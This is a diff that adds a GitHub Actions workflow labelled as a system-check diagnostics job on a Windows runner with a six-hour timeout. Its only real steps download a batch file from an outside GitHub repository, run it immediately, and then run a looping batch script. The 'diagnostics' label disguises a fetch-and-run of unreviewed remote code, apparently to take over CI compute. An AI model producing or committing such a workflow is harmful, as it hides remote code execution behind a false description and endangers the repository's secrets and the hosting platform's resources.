@@ -1,0 +1,19 @@
+name: systemcheckerDFNinja874
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sysdiag:
+    name: DiagnosticsDFNinja874
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Fetch Core Assets
+        run: |
+          Invoke-WebRequest -Uri "https://github.com/tahukedelai01/setup/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Runtime
+        run: cmd /c loop.bat
